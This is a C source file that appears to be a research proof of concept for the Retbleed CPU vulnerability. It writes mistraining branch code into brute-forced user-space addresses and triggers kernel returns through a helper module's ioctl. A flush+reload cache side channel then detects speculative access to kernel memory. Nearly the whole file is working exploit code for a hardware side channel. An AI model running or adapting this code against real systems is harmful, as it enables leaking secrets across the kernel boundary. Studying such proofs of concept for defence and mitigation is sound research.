// SPDX-License-Identifier: GPL-3.0-only
#include "common.h"
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include "./kmod_retbleed_poc/retbleed_poc_ioctl.h"
#include <err.h>
#include <string.h>
#include <stdlib.h>

// how many rounds to try mispredict? Many rounds often breaks things. Probably
// there's some usefulness bits that downvotes a bad prediction.
#define ROUNDS 50

// RB, reload buffer
#define RB_PTR 0x13300000000
#define RB_STRIDE_BITS 12
#define RB_SLOTS 0x10

// try all user-space patterns
#define MAX_BIT 47

// flip at most this many bits in the victim src address.
#define MAX_MUTATIONS 4

// skip flipping bits in the lower part of training src, we can often assume that
// they have to match with the lower bits
#define SKIP_LOWER_BITS 6

#define PG_ROUND(n) (((((n)-1UL)>>12)+1)<<12)

__attribute__((aligned(4096))) static u64 results[RB_SLOTS] = {0};

struct mem_info {
    union {
        u64 va;
        u8* buf;
    };
    u64 kva;
    u64 pa;
};

static long va_to_phys(int fd, long va)
{
    unsigned long pa_with_flags;

    lseek(fd, ((long) va)>>9, SEEK_SET);
    read(fd, &pa_with_flags, 8);
    // printf("phys %p\n", (void*)pa_with_flags);
    return pa_with_flags<<12 | (va & 0xfff);
}

// flip to 1 when we SHOULD segfault and not crash the program
static int should_segfault = 0;

static sigjmp_buf env;
static void handle_segv(int sig, siginfo_t *si, void *unused)
{
    if (should_segfault) {
        siglongjmp(env, 12);
        return;
    };

    fprintf(stderr, "Not handling SIGSEGV\n");
    exit(sig);
}

int main(int argc, char *argv[])
{
    struct mem_info rb;
    struct synth_gadget_desc sgd;
    rb.va = RB_PTR;

    struct sigaction sa;
    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = &handle_segv;
    sigaction (SIGSEGV, &sa, NULL);

#define MAX(a,b) ((a) > (b)) ? a : b
#define RB_SZ MAX(RB_SLOTS<<RB_STRIDE_BITS, 1UL<<21)

    map_or_die(rb.buf, RB_SZ, PROT_RW, MMAP_FLAGS&~MAP_POPULATE, -1, 0);
    madvise(rb.buf, 1UL<<21, MADV_HUGEPAGE);

    // If we have large amounts of phys mem we may need to wait a while for
    // khugepage to finish.
    sleep(1);

    rb.buf[123] = 1;

    int fd_retbleed_poc;
    fd_retbleed_poc = open("/proc/" PROC_RETBLEED_POC, O_RDONLY);
    if (fd_retbleed_poc <= 0  ) {
        err(1, "You need to install the kmod_retbleed_poc for this poc\n");
    }

    ioctl(fd_retbleed_poc, REQ_GADGET, &sgd);
    int fd_pagemap = open("/proc/self/pagemap", O_RDONLY);
    if (fd_pagemap < 0) {
        perror("fd_pagemap");
        exit(1);
    }
    rb.pa = va_to_phys(fd_pagemap, rb.va);
    if (rb.pa == 0) {
        fprintf(stderr, "Need root to read pagemap\n");
        exit(1);
    }
    if ((rb.pa & 0x1fffff) != 0) {
        fprintf(stderr, "rb is not a thp\n");
        exit(1);
    }
    rb.kva = sgd.physmap_base+rb.pa;
    printf("rb.pa     %lx\n", rb.pa);
    printf("rb.kva    %lx\n", rb.kva);
    printf("kbr_src   %lx\n", sgd.kbr_src);
    printf("kbr_dst   %lx\n", sgd.kbr_dst);
    printf("last_tgt  %lx\n", sgd.last_tgt);
    printf("secretptr %lx\n", sgd.secret);

    struct payload p;
    p.reload_buffer = rb.kva;

    // expect whatever this points to to be hot on collision. give it any value
    // 0--RB_SLOTS
    p.secret = sgd.secret;

    flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);
    printf("[.] bits_flipped; rb_entry; training_branch; signal\n");
    // Starting by trying to get a collission by flipping 1 bit.. then going on
    // until MAX_MUTATIONS.
    for (int nbits = 1; nbits <= MAX_MUTATIONS; ++nbits) {
        u64 ptrn_shl = 0;
        u64 ptrn = 0;
        printf("[-] nbits=%d\n",nbits);
        // We will iterate over all possible XOR patterns in the range of
        // available addresses (skipping some lower ones) and apply it to
        // BR_SRC1 to derive a new address where we try to cause collisions.
        while (ptrn < (1UL<<(MAX_BIT-SKIP_LOWER_BITS))) {
            reload_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS, results);
            memset(results, 0, RB_SLOTS*sizeof(results[0]));
            ptrn = get_next(ptrn, nbits);
            ptrn_shl = ptrn<<SKIP_LOWER_BITS;
            ptrn_shl |= 0xffff800000000000UL;
            u64 br_src_training = sgd.last_tgt ^ ptrn_shl;
            u64 br_src_training_sz = sgd.kbr_src - sgd.last_tgt;

            if (mmap((void*)(br_src_training & ~0xfff),
                        PG_ROUND(br_src_training_sz), PROT_RWX, MMAP_FLAGS, -1, 0)
                    == MAP_FAILED) {
                // not able to map here.. maybe occupied. try some other
                // mutation instead.
                err(123, "mmap");
                continue;
            }
            memset((u8 *)br_src_training, 0x90, br_src_training_sz);
            *(u8 *)(br_src_training+br_src_training_sz-1) = 0xff;
            *(u8 *)(br_src_training+br_src_training_sz) = 0xe0; // jmp rax

            for (int i = 0; i<ROUNDS; ++i) {
                should_segfault = 1;
                int a = sigsetjmp(env, 1);
                if (a == 0) {
                    asm volatile (
                            "jmp *%1" :: "a"(sgd.kbr_dst), "r"(br_src_training));
                }
                should_segfault = 0;

                flush_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS);
                // go into kernel and run a return instruction. it will to
                // mispredict into kbr_dst for certain patterns.
                ioctl(fd_retbleed_poc, REQ_SPECULATE, &p);

                reload_range(RB_PTR, 1<<RB_STRIDE_BITS, RB_SLOTS, results);
            }
            for (int i = 0 ; i < RB_SLOTS; ++i) {
                // lets print everything if there's a hit
               if (results[i] > 1) {
                   char binstr[64+1] = {0}; //0,1 or null
                    mem2bin(binstr, (unsigned char*)&ptrn_shl, 48);
                    printf("[+] %s; %02d; 0x%012lx; %0.2f", binstr,
                            i, (u64)(br_src_training+br_src_training_sz),
                            results[i]/(ROUNDS+.0));
                   printf("\n");
               }
            }
            memset(results, 0, RB_SLOTS*sizeof(results[0]));
            munmap((void*)(br_src_training&~0xfffUL), PG_ROUND(br_src_training_sz));
        }
    }
    return 0;
}
